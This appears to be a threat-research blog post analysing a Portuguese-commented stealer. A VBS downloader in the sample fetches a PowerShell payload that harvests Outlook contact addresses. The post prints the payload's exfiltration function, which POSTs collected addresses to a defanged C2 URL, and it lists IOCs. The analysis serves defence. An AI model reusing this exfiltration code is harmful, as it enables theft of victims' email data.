# Contents
  - Introduction.
  - Overview.
  - Technical Analysis.
    - Stage 1 : The ZIP file & VBA Script.
    - Stage 2 : Malicious PowerShell stealer. 
  - IOCs.
  - Conclusion.

# Introduction

Hello readers , this time I want to share some details about a stealer that targets Outlook accounts by stealing credentials like  email addresses and other data from a victim’s computer once they ran the malicious file. After collecting the data, it sends it to a C2 (Command and Control) server. So let’s see how this unknown stealer works and analyze it. 

# Overview

The infection chain is initiated when the victim receives a ZIP archive containing a malicious VBA script. Upon analysis of the script, a hardcoded Command and Control (C2) server URL is identified. This C2 server is responsible for delivering the next-stage payload—a PowerShell script—which is  downloaded and executed. The PowerShell payload and other payloads will be examined in the technical analysis section, so let us do it. 

# Technical Analysis

**The technical analysis of this stealer** includes examining the infection chain and its several steps involved in stealing the data. Next, we will go through each step in detail in this section. 

## Stage 1 : The ZIP file & VBA Script.

**During the initial analysis,** I received a malicious ZIP file, on [Virus Total](https://www.virustotal.com/gui/file/0fb0a0e1aaa59d929d2b0b65eda5e9b84496ad57fcc76c971d38d8a0fcf8d5bb/relations). Next, then I downloaded the sample and then on checking it out, I figured out that the first stage of the attack involves a Visual Basic script file. When the ZIP file is extracted, it contains a VBS script.

![image](https://github.com/user-attachments/assets/bc0cee26-c622-454d-9135-a110676c1615)


The Script contains Portuguese comments and it establishes a connection with a Command and Control (C2) server, as shown in the image, using the **GET** method. It then downloads a file named **`leiame.txt`** and saves it in **binary format** using the `ADODB.Stream` object. 

Then ,once the file is downloaded onto the victim's machine, it is stored in the `C:\Windows\Temp\` directory with the name **"script.ps1"**. After that, the script runs the PowerShell (.ps1) file . We will see its code in the next segment.

## Stage 2 : Malicious PowerShell stealer.

![image](https://github.com/user-attachments/assets/3daf0994-646f-4426-9506-b2980cf2f83e)


**This is the code of the PowerShell payload (a .ps1 file),** which contains several interesting functions used to steal data from the victim’s PC.

**The code is designed to steal data from the Outlook application.** It creates an Outlook app object and uses MAPI (Messaging Application Programming Interface) to access emails, contacts, calendars, and other data stored in Outlook. Using this, it collects credentials, contact lists, and useful address information. Then it also creates an array list called `GlobalList`, where it stores all the extracted contact addresses of the victim which it targets. 

**First, the script checks if Outlook data is available on the victim’s PC** by looking into the environment and the `APPDATA\Microsoft\Outlook` folder. If found, it proceeds to run the `ExfiltrateEmailAddressList()` function, which extracts all stored email addresses.

```nasm
function ExfiltrateEmailAddressList() {
  GetOutlookContactList
  GetContactFromEmails($OutlookAppMAPI.Folders)
  $FreeOutlookAppObj = [System.Runtime.Interopservices.Marshal]::ReleaseComObject($OutlookApp)

  $WebRequest = [System.Net.WebRequest]::Create("hxxps://auth[.]rastreiotransporte4f[.]com/mayl/saver/gravadados.php?lista=")
  $GlobalListStr = [System.Text.Encoding]::UTF8.GetBytes("list=$($GlobalList -join ';')")
  $WebRequest.Method = 'POST'
  $WebRequest.ContentType = 'application/x-www-form-urlencoded'
  $WebRequest.ContentLength = $GlobalListStr.length
  $RequestStream = $WebRequest.GetRequestStream()
  $RequestStream.Write($GlobalListStr, 0, $GlobalListStr.length)
  $RequestStream.Close()
  [System.Net.WebResponse] $WebResponse = $WebRequest.GetResponse()
}
```

![image](https://github.com/user-attachments/assets/fba085fd-21b4-44a9-b4a4-360791920859)


As seen in the code above, the script uses the `GetOutlookContactList` function to check all contacts available in the user’s Outlook account. It goes through each address in the address list and checks the user type. If the `AddressEntryUserType` is 10, it means the address belongs to the user’s personal contact list. User types from 0 to 5 generally refer to locally saved Outlook contacts or Exchange users from a company. 

All collected addresses are then saved in an array list called `$GlobalList`. After this extraction, the script also searches for more addresses in the subfolders of the Outlook folder.

After all the addresses are saved in `$GlobalList`, the script releases the Outlook application object. 

It then creates a web request to the URL `hxxps://auth.rastreiotransporte4f.com/mayl/saver/gravadados.php?lista=` and sends all the collected addresses to this URL using the **POST** method. That was all about this stealer, which targets Outlook Credentials , and I have decided to call it as **`Ladrão` ,** thank you for reading my small blog, I will keep posting some more interesting research, as I keep finding more new stuffs.

# IOCs

`https://auth[.]rastreiotransporte4f[.]com/mayl/saver/gravadados.php?lista=`

`d69608c66f32b25342d3752ced8dc36fdb94d4d914a9a5339faaf29d3f2174f6` 

`bcd21beea7e7aad25d85c15f22a047bdf2501154534ea2b9a4988a16e497924f` 

`https://wbml[.]web4mverifyer[.]com/mayl/leiame[.]txt`

# Conclusion

Right now, there is no clear information about where this stealer came from and which specific region it is targeting, but based on some comments written in Portuguese, we can guess a few things about its origin.
